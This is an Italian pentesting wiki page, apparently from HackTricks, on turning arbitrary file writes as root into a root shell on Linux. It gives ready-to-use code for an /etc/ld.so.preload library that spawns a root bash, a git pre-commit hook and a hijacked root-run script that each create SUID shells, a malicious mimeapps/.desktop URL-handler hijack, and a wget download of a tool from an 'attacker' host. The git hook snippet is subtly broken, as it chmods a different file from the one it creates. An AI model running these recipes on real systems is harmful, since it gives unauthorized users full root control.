# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Questo file si comporta come la variabile d'ambiente **`LD_PRELOAD`**, ma funziona anche in **SUID binaries**.\
Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **percorso a una libreria che verrà caricata** con ogni binario eseguito.

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** su vari **eventi** in un repository git, come quando viene creato un commit, un merge... Quindi se uno **script o utente privilegiato** esegue frequentemente queste azioni ed è possibile **scrivere nella cartella `.git`**, questo può essere sfruttato per ottenere **privesc**.

Ad esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** così che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron e file temporali

TODO

### File di servizio e socket

TODO

### binfmt_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario deve eseguire quale tipo di file. TODO: verificare i requisiti per abusare di questo per eseguire una rev shell quando un tipo di file comune è aperto.

### Overwrite schema handlers (like http: or https:)

Un attaccante con permessi di scrittura sulle directory di configurazione della vittima può facilmente sostituire o creare file che cambiano il comportamento del sistema, causando esecuzione di codice non voluta. Modificando il file `$HOME/.config/mimeapps.list` per puntare i gestori URL HTTP e HTTPS a un file malevolo (es., impostando `x-scheme-handler/http=evil.desktop`), l'attaccante si assicura che **cliccando qualsiasi link http o https venga eseguito il codice specificato in quel file `evil.desktop`**. Ad esempio, dopo aver inserito il seguente codice malevolo in `evil.desktop` in `$HOME/.local/share/applications`, qualsiasi clic su un URL esterno esegue il comando incorporato:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Per maggiori informazioni controlla [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) dove è stato usato per sfruttare una vulnerabilità reale.

### Root che esegue script/binari scrivibili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binario all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:

- **Rilevare l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per catturare root che invoca percorsi controllati dall'utente:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Conferma la scrivibilità:** assicurati che sia il file di destinazione che la relativa directory siano di proprietà e scrivibili dal tuo utente.
- **Hijack the target:** esegui il backup del binary/script originale e inserisci un payload che crea una SUID shell (o qualsiasi altra azione root), poi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Attiva l'azione privilegiata** (ad es., premendo un pulsante UI che spawns the helper). Quando root riesegue il hijacked path, prendi l'escalated shell con `./rootshell -p`.

## Riferimenti

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
